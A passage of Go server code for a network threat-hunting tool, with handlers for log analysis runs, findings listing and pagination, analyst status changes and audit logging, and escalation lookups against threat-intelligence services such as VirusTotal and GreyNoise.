package server

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/BushidoCyb3r/Archer/internal/analysis"
	"github.com/BushidoCyb3r/Archer/internal/model"
	"github.com/BushidoCyb3r/Archer/internal/store"
	"github.com/BushidoCyb3r/Archer/internal/version"
)

// JSON body-size caps for analyst-facing mutation endpoints. Pre-
// fix every decoder below read unbounded, so a compromised analyst
// session (or a buggy automation script) could write a multi-MB
// note onto a finding, replace the allowlist with a 100MB array, or
// have the JSON decoder consume a 1GB body just to PATCH a status.
// All persisted to disk and copied through every SetFindings merge.
// Bounds are sized to the realistic content shape with generous
// headroom; the import endpoint has its own larger cap because that
// genuinely carries a bundle. The Quiver and sensor-management
// endpoints already had matching caps. Audit 2026-05-10 NEW-35.
const (
	noteBodyMaxBytes     = 64 << 10  // PATCH /api/findings/{id}, POST /notes — note + status
	escalateBodyMaxBytes = 256 << 10 // POST /escalate — note + ips/services arrays
	listBodyMaxBytes     = 4 << 20   // PUT /allowlist, /ioc-list — room for ~150K entries
	suppressBodyMaxBytes = 8 << 10   // POST /suppressions — tiny payload
	configBodyMaxBytes   = 16 << 10  // PUT /config — fixed-shape struct
)

// sensorFromPath returns the first path component under logsDir, which is
// the sensor name in a Quiver-fed deployment. Pre-Quiver / manual uploads
// dropped logs into top-level subdirectories that served the same role —
// the field's logical meaning is the same, only the source has changed.
// e.g. logsDir=/logs  path=/logs/zeek-01/2024-01-01/conn.log  →  "zeek-01"
func sensorFromPath(logsDir, filePath string) string {
	logsDir = filepath.Clean(logsDir)
	filePath = filepath.Clean(filePath)
	rel, err := filepath.Rel(logsDir, filePath)
	if err != nil || rel == "." {
		return ""
	}
	parts := strings.SplitN(rel, string(filepath.Separator), 2)
	if len(parts) > 0 && parts[0] != "." {
		return parts[0]
	}
	return ""
}

// handleAnalyze runs a full analysis pass over the configured /logs
// directory. Findings are merged via fingerprint, so analyst notes/status
// survive. The single source of input is /logs — operators wanting to
// analyze ad-hoc bundles drop them into /logs/<name>/<date>/ first.
//
// Pre-v0.14.8 this handler ALSO accepted a {"config": {...}} body and
// silently rewrote the analyzer config before running, bypassing the
// admin gate, range validation (off-hours equality, port bounds), and
// audit_log row that PUT /api/config enforces. The handler's route
// gate is `write` (analyst+), so any compromised analyst session
// could disable beacon detection, rotate operator API keys, or shift
// the off-hours window — with no audit trail. Asymmetric-validation
// of the same shape as NEW-15 (sensor name validated at enroll but
// not checkin) and NEW-37 (status validated at import but not
// PATCH). The config-rewrite path is removed entirely. Config
// changes go through PUT /api/config (admin-only, validated,
// audited as config_change). v0.14.8 NEW-60.
//
// v0.14.9 NEW-65: emits an analyze_start audit row on successful
// claim. Watch-driven runs call s.launchAnalysis directly without
// passing through this handler, so they remain unattributed — that's
// the intended split: "who clicked Run" vs. "scheduler tick fired."
func (s *Server) handleAnalyze(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	files := s.scanLogsDir()
	if len(files) == 0 {
		jsonError(w, "no logs found in /logs", http.StatusBadRequest)
		return
	}

	// launchAnalysis does the atomic TryStartAnalysis claim — see
	// NEW-31. The pre-fix IsAnalyzing check was racy against
	// concurrent invocations (watch tick fires while user clicks).
	if !s.launchAnalysis(files) {
		jsonError(w, "analysis already running", http.StatusConflict)
		return
	}
	s.recordAudit(r, "analyze_start", auditEvent{
		Details: map[string]any{"file_count": len(files)},
	})
	w.WriteHeader(http.StatusAccepted)
	json.NewEncoder(w).Encode(map[string]string{"status": "started"})
}

// handleAnalyzeReset clears the findings table and relaunches analysis from
// scratch. Admin-only. Intended for "the config changed, I want a clean
// baseline" workflows where preserving old findings would be misleading.
func (s *Server) handleAnalyzeReset(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if u := userFromCtx(r); u.Role != model.RoleAdmin {
		jsonError(w, "forbidden", http.StatusForbidden)
		return
	}
	files := s.scanLogsDir()
	if len(files) == 0 {
		jsonError(w, "no logs found in /logs", http.StatusBadRequest)
		return
	}
	cleared := s.store.ClearFindings()
	if !s.launchAnalysis(files) {
		jsonError(w, "analysis already running", http.StatusConflict)
		return
	}
	s.recordAudit(r, "analyze_reset", auditEvent{
		Details: map[string]any{
			"file_count":       len(files),
			"findings_cleared": cleared,
		},
	})
	w.WriteHeader(http.StatusAccepted)
	json.NewEncoder(w).Encode(map[string]any{
		"status":           "started",
		"findings_cleared": cleared,
	})
}

// handleAnalyzeStatus returns whether analysis is currently running/paused.
func (s *Server) handleAnalyzeStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	s.analyzerMu.Lock()
	az := s.activeAnalyzer
	s.analyzerMu.Unlock()

	running := az != nil
	paused := running && az.IsPaused()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]bool{"running": running, "paused": paused})
}

// handleAnalyzeCancel stops the running analysis.
func (s *Server) handleAnalyzeCancel(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	s.analyzerMu.Lock()
	az := s.activeAnalyzer
	s.analyzerMu.Unlock()
	if az == nil {
		jsonError(w, "no analysis running", http.StatusConflict)
		return
	}
	az.Cancel()
	s.recordAudit(r, "analyze_cancel", auditEvent{})
	w.WriteHeader(http.StatusOK)
}

// handleAnalyzePause pauses the running analysis.
func (s *Server) handleAnalyzePause(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	s.analyzerMu.Lock()
	az := s.activeAnalyzer
	s.analyzerMu.Unlock()
	if az == nil {
		jsonError(w, "no analysis running", http.StatusConflict)
		return
	}
	az.Pause()
	s.recordAudit(r, "analyze_pause", auditEvent{})
	w.WriteHeader(http.StatusOK)
}

// handleAnalyzeResume resumes a paused analysis.
func (s *Server) handleAnalyzeResume(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	s.analyzerMu.Lock()
	az := s.activeAnalyzer
	s.analyzerMu.Unlock()
	if az == nil {
		jsonError(w, "no analysis running", http.StatusConflict)
		return
	}
	az.Resume()
	s.recordAudit(r, "analyze_resume", auditEvent{})
	w.WriteHeader(http.StatusOK)
}

// handleFindings returns filtered and sorted findings.
//
// Pagination: ?limit=N&offset=K page through the result. Default limit
// is 1000 (the analyst-table sweet spot for hunt workflows that go
// top-down by score); cap is 5000 (above that we'd be back to the
// pre-pagination payload sizes). The total result-set size is
// surfaced via X-Total-Count and X-Has-More response headers so the
// UI can render an accurate "Load more" affordance without a second
// round-trip.
//
// Export endpoints (/api/export/csv, /api/export/json) deliberately
// do NOT paginate — they go through filterFindings directly and dump
// the full set as a single download, which is the right behavior for
// "give me everything for this hunt" workflows.
func (s *Server) handleFindings(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	q := r.URL.Query()
	sortCol := q.Get("sort")
	if sortCol == "" {
		sortCol = "score"
	}
	sortDir := q.Get("dir")

	limit, offset := parseListPagination(q)

	result := s.filterFindings(s.store.GetFindings(), q)
	sortFindings(result, sortCol, sortDir)

	total := len(result)
	page := result
	if offset >= total {
		page = nil
	} else {
		end := offset + limit
		if end > total {
			end = total
		}
		page = result[offset:end]
	}
	hasMore := offset+len(page) < total

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Total-Count", strconv.Itoa(total))
	if hasMore {
		w.Header().Set("X-Has-More", "true")
	} else {
		w.Header().Set("X-Has-More", "false")
	}
	w.Header().Set("Access-Control-Expose-Headers", "X-Total-Count, X-Has-More")
	json.NewEncoder(w).Encode(projectFindingList(page))
}

// sortFindings sorts the slice in place by the same column / direction
// rules used by /api/findings. Shared with the position lookup so the
// "where is finding X" answer matches the ordering of the listing.
func sortFindings(findings []model.Finding, sortCol, sortDir string) {
	sort.Slice(findings, func(i, j int) bool {
		a, b := findings[i], findings[j]
		var less bool
		switch sortCol {
		case "score":
			less = a.Score < b.Score
		case "severity":
			less = severityOrder(a.Severity) < severityOrder(b.Severity)
		case "type":
			less = a.Type < b.Type
		case "src_ip":
			less = a.SrcIP < b.SrcIP
		case "dst_ip":
			less = a.DstIP < b.DstIP
		case "timestamp":
			less = a.Timestamp < b.Timestamp
		default:
			less = a.Score < b.Score
		}
		if sortDir == "asc" {
			return less
		}
		return !less
	})
}

// parseListPagination reads ?limit and ?offset from the query string,
// applies sane defaults (limit 1000, offset 0), and clamps to safe
// bounds (limit max 5000, offset min 0). Anything unparseable falls
// back to the defaults rather than erroring — pagination should never
// be the reason a request fails.
func parseListPagination(q url.Values) (limit, offset int) {
	const (
		defaultLimit = 1000
		maxLimit     = 50000
	)
	limit = defaultLimit
	if v := q.Get("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			limit = n
		}
	}
	if limit > maxLimit {
		limit = maxLimit
	}
	if v := q.Get("offset"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
			offset = n
		}
	}
	return limit, offset
}

// listFinding mirrors model.Finding for the list endpoint but omits the
// per-finding chart/evidence payload that bloats the response. The
// analyst's table view uses none of TSData / Intervals / Notes — those
// are read by the detail panel via /api/findings/{id}, which keeps the
// full shape. On a corpus with thousands of Beaconing findings, omitting
// TSData alone cut the list response by ~100 MB in measurement.
//
// Field tags match model.Finding so existing UI code reads the same JSON
// keys; only the three heavy fields are absent from the wire format.
type listFinding struct {
	ID          int            `json:"id"`
	Type        string         `json:"type"`
	Severity    model.Severity `json:"severity"`
	Score       int            `json:"score"`
	SrcIP       string         `json:"src_ip"`
	DstIP       string         `json:"dst_ip"`
	DstPort     string         `json:"dst_port"`
	Detail      string         `json:"detail"`
	Timestamp   string         `json:"timestamp"`
	SourceFile  string         `json:"source_file"`
	Status      model.Status   `json:"status"`
	Analyst     string         `json:"analyst"`
	AnalystNote string         `json:"analyst_note"`
	StatusTS    string         `json:"status_ts"`
	IOCMatch    bool           `json:"ioc_match"`
	IOCSource   string         `json:"ioc_source,omitempty"`
	IsNew       bool           `json:"is_new"`
	Sensor      string         `json:"sensor,omitempty"`
}

func projectFindingList(in []model.Finding) []listFinding {
	out := make([]listFinding, len(in))
	for i, f := range in {
		out[i] = listFinding{
			ID: f.ID, Type: f.Type, Severity: f.Severity, Score: f.Score,
			SrcIP: f.SrcIP, DstIP: f.DstIP, DstPort: f.DstPort,
			Detail: f.Detail, Timestamp: f.Timestamp, SourceFile: f.SourceFile,
			Status: f.Status, Analyst: f.Analyst, AnalystNote: f.AnalystNote,
			StatusTS: f.StatusTS, IOCMatch: f.IOCMatch, IOCSource: f.IOCSource,
			IsNew: f.IsNew, Sensor: f.Sensor,
		}
	}
	return out
}

// handleFindingsCounts returns per-status totals (open / acknowledged /
// escalated / ioc-matched) under the current filter. Used by the
// dashboard's tab counter so analysts see accurate totals on every
// tab without having to visit each one. Filters honored: search, type,
// severity, min_score, src_ip, dst_ip, dst_port, sensor, from, to,
// delta. Status / ioc_only filters are stripped — the endpoint
// computes those buckets internally.
func (s *Server) handleFindingsCounts(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	q := r.URL.Query()
	// Strip the bucket-defining params so filterFindings doesn't apply
	// them — we want every finding the broader filter accepts so we can
	// bucket by status.
	q.Del("status")
	q.Del("ioc_only")
	q.Del("limit")
	q.Del("offset")

	all := s.filterFindings(s.store.GetFindings(), q)
	var open, ack, esc, ioc int
	for _, f := range all {
		switch string(f.Status) {
		case "":
			open++
		case "acknowledged":
			ack++
		case "escalated":
			esc++
		}
		if f.IOCMatch || model.IsThreatIntelType(f.Type) {
			ioc++
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{
		"open":  open,
		"ack":   ack,
		"esc":   esc,
		"ioc":   ioc,
		"total": len(all),
	})
}

// handleFindingsFacets returns the distinct values of low-cardinality
// columns (type, sensor) across the *entire* findings set, ignoring
// pagination and current type/sensor selection. The dashboard's filter
// dropdowns use this so they always show every available type / sensor,
// not just the ones present on the currently-rendered page.
//
// Status / ioc_only / delta / type / sensor query params are stripped —
// the rest of the filter set still applies (so a time-range or score
// filter narrows the dropdown options to "types observed in this
// window"). That keeps the dropdown options consistent with what the
// rest of the filter bar will surface.
func (s *Server) handleFindingsFacets(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	q := r.URL.Query()
	q.Del("status")
	q.Del("ioc_only")
	q.Del("delta")
	q.Del("type")
	q.Del("sensor")
	q.Del("limit")
	q.Del("offset")

	all := s.filterFindings(s.store.GetFindings(), q)
	typeSet := make(map[string]struct{})
	sensorSet := make(map[string]struct{})
	for _, f := range all {
		if f.Type != "" {
			typeSet[f.Type] = struct{}{}
		}
		if f.Sensor != "" {
			sensorSet[f.Sensor] = struct{}{}
		}
	}
	types := make([]string, 0, len(typeSet))
	for t := range typeSet {
		types = append(types, t)
	}
	sort.Strings(types)
	sensors := make([]string, 0, len(sensorSet))
	for s := range sensorSet {
		sensors = append(sensors, s)
	}
	sort.Strings(sensors)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"types":   types,
		"sensors": sensors,
	})
}

func (s *Server) handleFinding(w http.ResponseWriter, r *http.Request) {
	rest := strings.TrimPrefix(r.URL.Path, "/api/findings/")
	parts := strings.SplitN(rest, "/", 2)
	idStr := parts[0]
	id, err := strconv.Atoi(idStr)
	if err != nil || id <= 0 {
		jsonError(w, "invalid id", http.StatusBadRequest)
		return
	}

	// Sub-resource dispatch: /api/findings/{id}/raw → raw-log pivot;
	// /api/findings/{id}/position → page-offset lookup for bell jumps.
	if len(parts) > 1 {
		switch parts[1] {
		case "raw":
			s.handleFindingRaw(w, r, id)
		case "position":
			s.handleFindingPosition(w, r, id)
		default:
			http.NotFound(w, r)
		}
		return
	}

	switch r.Method {
	case http.MethodGet:
		f, ok := s.store.GetFinding(id)
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(f)

	case http.MethodPatch:
		if u := userFromCtx(r); u.Role != model.RoleAnalyst && u.Role != model.RoleAdmin {
			http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
			return
		}
		var req struct {
			Status string `json:"status"`
			Note   string `json:"note"`
		}
		if err := decodeJSONBody(w, r, &req, noteBodyMaxBytes); err != nil {
			return
		}
		// Validate the status string against the known enum so a buggy
		// automation client or a compromised analyst session can't
		// silently write "archived" or any other free-form value into
		// the findings table — which would persist faithfully and
		// disappear from the UI's tab filters. Mirrors the validation
		// validateImportedFinding already applies on /api/import.
		// v0.14.3 NEW-37.
		switch model.Status(req.Status) {
		case model.StatusOpen, model.StatusAcknowledged, model.StatusEscalated:
			// ok
		default:
			jsonError(w, "invalid status — must be \"\" (open), \"acknowledged\", or \"escalated\"", http.StatusBadRequest)
			return
		}
		user := userFromCtx(r)
		ts := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
		// UpdateFinding returns the pre-mutation snapshot under the
		// same mutex as the write, so the audit row's BeforeValue is
		// the actual prior state — no race against a concurrent PATCH
		// landing between a separate GetFinding and UpdateFinding.
		// v0.14.2 NEW-36.
		before, ok := s.store.UpdateFinding(id, model.Status(req.Status), user.DisplayName(), req.Note, ts)
		if !ok {
			http.NotFound(w, r)
			return
		}
		if req.Note != "" {
			s.store.AddNote(id, model.Note{
				Text:        req.Note,
				Author:      user.DisplayName(),
				AuthorEmail: user.Email,
				Timestamp:   ts,
			})
		}
		s.recordAudit(r, "finding_status_change", auditEvent{
			TargetType:  "finding",
			TargetID:    strconv.Itoa(id),
			TargetName:  findingAuditName(before),
			BeforeValue: map[string]any{"status": string(before.Status)},
			AfterValue:  map[string]any{"status": req.Status},
			Details:     map[string]any{"note_length": len(strings.TrimSpace(req.Note))},
		})
		jsonOK(w)

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleFindingPosition returns the absolute zero-indexed position of a
// finding within /api/findings under the same filter + sort parameters.
// The bell-notification "Jump" action uses it to navigate to the page
// containing the target finding regardless of the analyst's current
// pagination offset. 404 means the finding does not match the supplied
// filter (deleted, archived, or status mismatch).
func (s *Server) handleFindingPosition(w http.ResponseWriter, r *http.Request, id int) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	q := r.URL.Query()
	sortCol := q.Get("sort")
	if sortCol == "" {
		sortCol = "score"
	}
	sortDir := q.Get("dir")

	result := s.filterFindings(s.store.GetFindings(), q)
	sortFindings(result, sortCol, sortDir)

	pos := -1
	for i, f := range result {
		if f.ID == id {
			pos = i
			break
		}
	}

	w.Header().Set("Content-Type", "application/json")
	if pos < 0 {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]any{
			"found": false,
			"total": len(result),
		})
		return
	}
	json.NewEncoder(w).Encode(map[string]any{
		"found":  true,
		"offset": pos,
		"total":  len(result),
	})
}

// handleTIServices reports which TI services have API keys configured,
// without exposing the keys themselves. GreyNoise reports true
// unconditionally — its Community API works without a key (rate-limited),
// so the service is always available regardless of config state.
func (s *Server) handleTIServices(w http.ResponseWriter, r *http.Request) {
	cfg := s.store.GetConfig()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]bool{
		"vt":        cfg.VirusTotalAPIKey != "",
		"crowdsec":  cfg.CrowdSecAPIKey != "",
		"otx":       cfg.OTXAPIKey != "",
		"abuseipdb": cfg.AbuseIPDBAPIKey != "",
		"greynoise": true,
		"censys":    cfg.CensysAPIID != "" && cfg.CensysAPISecret != "",
	})
}

func (s *Server) handleEscalate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if u := userFromCtx(r); u.Role == model.RoleViewer {
		http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
		return
	}
	// Extract ID from path: /api/findings/{id}/escalate
	path := strings.TrimPrefix(r.URL.Path, "/api/findings/")
	path = strings.TrimSuffix(path, "/escalate")
	id, err := strconv.Atoi(path)
	if err != nil {
		jsonError(w, "invalid id", http.StatusBadRequest)
		return
	}
	var req struct {
		Note     string   `json:"note"`
		IPs      []string `json:"ips"`
		Services []string `json:"services"`
	}
	if err := decodeJSONBody(w, r, &req, escalateBodyMaxBytes); err != nil {
		return
	}
	user := userFromCtx(r)
	ts := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	// UpdateFinding returns the pre-mutation snapshot under the same
	// mutex so the audit row's BeforeValue.status is the actual prior
	// state, not a separate GetFinding read that races against
	// concurrent PATCHes. v0.14.2 NEW-36.
	before, ok := s.store.UpdateFinding(id, model.StatusEscalated, user.DisplayName(), req.Note, ts)
	if !ok {
		http.NotFound(w, r)
		return
	}
	if req.Note != "" {
		s.store.AddNote(id, model.Note{
			Text:        req.Note,
			Author:      user.DisplayName(),
			AuthorEmail: user.Email,
			Timestamp:   ts,
		})
	}
	// Audit body deliberately omits the note text — it could carry
	// operationally sensitive specifics (named hosts, target
	// indicators), and the note is already preserved on the finding
	// itself. We record only the shape: length, selected IPs/services.
	s.recordAudit(r, "finding_escalate", auditEvent{
		TargetType:  "finding",
		TargetID:    strconv.Itoa(id),
		TargetName:  findingAuditName(before),
		BeforeValue: map[string]any{"status": string(before.Status)},
		AfterValue:  map[string]any{"status": string(model.StatusEscalated)},
		Details: map[string]any{
			"note_length": len(strings.TrimSpace(req.Note)),
			"ips":         req.IPs,
			"services":    req.Services,
		},
	})

	// Background TI lookup using analyst-selected artifacts and services.
	if len(req.IPs) > 0 && len(req.Services) > 0 {
		svcSet := make(map[string]bool, len(req.Services))
		for _, svc := range req.Services {
			svcSet[svc] = true
		}
		f, _ := s.store.GetFinding(id)
		go s.runTIEscalation(f, req.IPs, svcSet)
	}
	jsonOK(w)
}

func (s *Server) runTIEscalation(f model.Finding, ips []string, svcs map[string]bool) {
	cfg := s.store.GetConfig()
	client := &http.Client{Timeout: 8 * time.Second}
	ts := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	hitCount := 0

	// Per-IP grouping buffer. Every publishHit/publishInfo/publishClean call
	// appends a line here; once the full IP×service loop finishes we write one
	// consolidated note instead of N small ones (the previous design left
	// the notes thread cluttered with one row per service per IP).
	//
	// `informative` is the cross-annotation gate: hits and substantive non-hit
	// findings (e.g. GreyNoise classifying an IP as CiscoOpenDNS, Censys
	// returning a host's service list) get the flag set; "no record found",
	// "lookup failed", and "request failed" stay false so they don't pollute
	// other findings with empty noise.
	type lineEntry struct {
		ip, text         string
		hit, informative bool
	}
	var lines []lineEntry

	doReq := func(req *http.Request) ([]byte, bool) {
		resp, err := client.Do(req)
		if err != nil {
			return nil, false
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		return body, true
	}

	// currentIP is set by the per-IP loop below so publishHit/publishClean
	// know which IP a result belongs to without threading it through every
	// call site. Cleaner than passing dst through every nested closure.
	var currentIP string

	// publishHit appends a hit line and fires an SSE toast immediately
	// (live UI feedback) — the persistent note is written once at the end.
	publishHit := func(source, detail string, sev model.Severity) {
		hitCount++
		lines = append(lines, lineEntry{ip: currentIP, text: fmt.Sprintf("⚠ [%s] %s", source, detail), hit: true, informative: true})
		evtData, _ := json.Marshal(map[string]any{
			"finding_id": f.ID, "source": source, "severity": string(sev), "detail": detail, "hit": true,
		})
		s.broker.Publish(SSEEvent{Type: "ti_result", Data: string(evtData)})
	}

	// publishInfo appends a non-hit but substantive line — e.g. GreyNoise
	// classifying an IP as benign infrastructure, Censys returning a host's
	// service list. Cross-noted onto other findings the IP appears in so an
	// analyst opening (say) a beacon finding sees the enrichment context.
	publishInfo := func(source, detail string) {
		lines = append(lines, lineEntry{ip: currentIP, text: fmt.Sprintf("ℹ [%s] %s", source, detail), hit: false, informative: true})
		evtData, _ := json.Marshal(map[string]any{
			"finding_id": f.ID, "source": source, "severity": string(model.SevInfo), "detail": detail, "hit": false,
		})
		s.broker.Publish(SSEEvent{Type: "ti_result", Data: string(evtData)})
	}

	// publishClean appends a non-informative clean line — "no record found",
	// "lookup failed", "request failed". Recorded in the consolidated note on
	// the originating finding for completeness, but NOT cross-noted since
	// these carry no signal worth surfacing on unrelated findings.
	publishClean := func(source, detail string) {
		lines = append(lines, lineEntry{ip: currentIP, text: fmt.Sprintf("✓ [%s] %s", source, detail), hit: false, informative: false})
		evtData, _ := json.Marshal(map[string]any{
			"finding_id": f.ID, "source": source, "severity": string(model.SevInfo), "detail": detail, "hit": false,
		})
		s.broker.Publish(SSEEvent{Type: "ti_result", Data: string(evtData)})
	}

	for _, dst := range ips {
		if dst == "" || dst == "—" || dst == "(network)" {
			continue
		}
		currentIP = dst
		isIP := strings.Count(dst, ".") == 3

		if svcs["crowdsec"] && cfg.CrowdSecAPIKey != "" && isIP {
			if req, err := http.NewRequest("GET", fmt.Sprintf("https://cti.api.crowdsec.net/v2/smoke/%s", dst), nil); err == nil {
				req.Header.Set("X-Api-Key", cfg.CrowdSecAPIKey)
				if body, ok := doReq(req); ok {
					var data struct {
						Scores struct {
							Overall struct {
								Total float64 `json:"total"`
							} `json:"overall"`
						} `json:"scores"`
					}
					if json.Unmarshal(body, &data) == nil {
						if data.Scores.Overall.Total > 0 {
							sev := model.SevHigh
							if data.Scores.Overall.Total > 5 {
								sev = model.SevCritical
							}
							publishHit("CrowdSec", fmt.Sprintf("%s reputation score %.2f", dst, data.Scores.Overall.Total), sev)
						} else {
							publishClean("CrowdSec", fmt.Sprintf("%s - no threats found", dst))
						}
					} else {
						publishClean("CrowdSec", fmt.Sprintf("%s - lookup failed", dst))
					}
				} else {
					publishClean("CrowdSec", fmt.Sprintf("%s - request failed", dst))
				}
			}
		}

		if svcs["vt"] && cfg.VirusTotalAPIKey != "" {
			vtURL := fmt.Sprintf("https://www.virustotal.com/api/v3/ip_addresses/%s", dst)
			if !isIP {
				vtURL = fmt.Sprintf("https://www.virustotal.com/api/v3/domains/%s", dst)
			}
			if req, err := http.NewRequest("GET", vtURL, nil); err == nil {
				req.Header.Set("x-apikey", cfg.VirusTotalAPIKey)
				if body, ok := doReq(req); ok {
					var data struct {
						Data struct {
							Attributes struct {
								LastAnalysisStats map[string]int `json:"last_analysis_stats"`
							} `json:"attributes"`
						} `json:"data"`
					}
					if json.Unmarshal(body, &data) == nil {
						stats := data.Data.Attributes.LastAnalysisStats
						if mal := stats["malicious"]; mal > 0 {
							sev := model.SevHigh
							if mal > 3 {
								sev = model.SevCritical
							}
							publishHit("VirusTotal", fmt.Sprintf("%d engines flagged %s as malicious", mal, dst), sev)
						} else {
							publishClean("VirusTotal", fmt.Sprintf("%s - no malicious detections", dst))
						}
					} else {
						publishClean("VirusTotal", fmt.Sprintf("%s - lookup failed", dst))
					}
				} else {
					publishClean("VirusTotal", fmt.Sprintf("%s - request failed", dst))
				}
			}
		}

		if svcs["otx"] && cfg.OTXAPIKey != "" {
			otxURL := fmt.Sprintf("https://otx.alienvault.com/api/v1/indicators/IPv4/%s/general", dst)
			if !isIP {
				otxURL = fmt.Sprintf("https://otx.alienvault.com/api/v1/indicators/domain/%s/general", dst)
			}
			if req, err := http.NewRequest("GET", otxURL, nil); err == nil {
				req.Header.Set("X-OTX-API-KEY", cfg.OTXAPIKey)
				if body, ok := doReq(req); ok {
					var data struct {
						PulseInfo struct {
							Count int `json:"count"`
						} `json:"pulse_info"`
						Reputation int `json:"reputation"`
					}
					if json.Unmarshal(body, &data) == nil {
						if data.PulseInfo.Count > 0 || data.Reputation > 0 {
							sev := model.SevHigh
							if data.PulseInfo.Count > 5 {
								sev = model.SevCritical
							}
							publishHit("OTX", fmt.Sprintf("%s found in %d threat pulse(s)", dst, data.PulseInfo.Count), sev)
						} else {
							publishClean("OTX", fmt.Sprintf("%s - no threat pulses found", dst))
						}
					} else {
						publishClean("OTX", fmt.Sprintf("%s - lookup failed", dst))
					}
				} else {
					publishClean("OTX", fmt.Sprintf("%s - request failed", dst))
				}
			}
		}

		if svcs["abuseipdb"] && cfg.AbuseIPDBAPIKey != "" && isIP {
			if req, err := http.NewRequest("GET", fmt.Sprintf("https://api.abuseipdb.com/api/v2/check?ipAddress=%s&maxAgeInDays=90", dst), nil); err == nil {
				req.Header.Set("Key", cfg.AbuseIPDBAPIKey)
				req.Header.Set("Accept", "application/json")
				if body, ok := doReq(req); ok {
					var data struct {
						Data struct {
							AbuseConfidenceScore int `json:"abuseConfidenceScore"`
							TotalReports         int `json:"totalReports"`
						} `json:"data"`
					}
					if json.Unmarshal(body, &data) == nil {
						if data.Data.AbuseConfidenceScore > 0 {
							sev := model.SevHigh
							if data.Data.AbuseConfidenceScore > 75 {
								sev = model.SevCritical
							}
							publishHit("AbuseIPDB", fmt.Sprintf("%s confidence score %d%% (%d reports)", dst, data.Data.AbuseConfidenceScore, data.Data.TotalReports), sev)
						} else {
							publishClean("AbuseIPDB", fmt.Sprintf("%s - no abuse reports", dst))
						}
					} else {
						publishClean("AbuseIPDB", fmt.Sprintf("%s - lookup failed", dst))
					}
				} else {
					publishClean("AbuseIPDB", fmt.Sprintf("%s - request failed", dst))
				}
			}
		}

		// GreyNoise Community API — IP-only, returns the noise/riot/classification
		// triple. The big triage signal is `noise:true` ("this is internet
		// background scanning, not someone targeting you"); a `classification:
		// malicious` is the rare hit. Works unauthenticated; an optional key
		// raises the rate limit but isn't required.
		if svcs["greynoise"] && isIP {
			if req, err := http.NewRequest("GET", fmt.Sprintf("https://api.greynoise.io/v3/community/%s", dst), nil); err == nil {
				if cfg.GreyNoiseAPIKey != "" {
					req.Header.Set("key", cfg.GreyNoiseAPIKey)
				}
				if body, ok := doReq(req); ok {
					var data struct {
						Noise          bool   `json:"noise"`
						Riot           bool   `json:"riot"`
						Classification string `json:"classification"`
						Name           string `json:"name"`
						Message        string `json:"message"`
					}
					if json.Unmarshal(body, &data) == nil {
						switch {
						case data.Classification == "malicious":
							sev := model.SevHigh
							if data.Noise {
								sev = model.SevCritical // both flagged AND scanning
							}
							publishHit("GreyNoise", fmt.Sprintf("%s classified malicious (%s)", dst, data.Name), sev)
						case data.Riot:
							publishInfo("GreyNoise", fmt.Sprintf("%s known benign service: %s", dst, data.Name))
						case data.Noise:
							publishInfo("GreyNoise", fmt.Sprintf("%s background internet scanner (%s) — likely not targeted", dst, data.Name))
						case data.Message == "IP not observed scanning the internet or contained in RIOT data set.":
							publishClean("GreyNoise", fmt.Sprintf("%s - no record found", dst))
						case data.Classification != "":
							publishInfo("GreyNoise", fmt.Sprintf("%s - %s", dst, data.Classification))
						default:
							publishClean("GreyNoise", fmt.Sprintf("%s - no record found", dst))
						}
					} else {
						publishClean("GreyNoise", fmt.Sprintf("%s - lookup failed", dst))
					}
				} else {
					publishClean("GreyNoise", fmt.Sprintf("%s - request failed", dst))
				}
			}
		}

		// Censys Hosts API — IP-only, requires Basic auth (API ID + Secret).
		// Censys doesn't classify malicious vs benign directly, so this is
		// always informational: which services are running and when the host
		// was last observed. Useful context to attach to the finding without
		// generating a hit/clean verdict on its own.
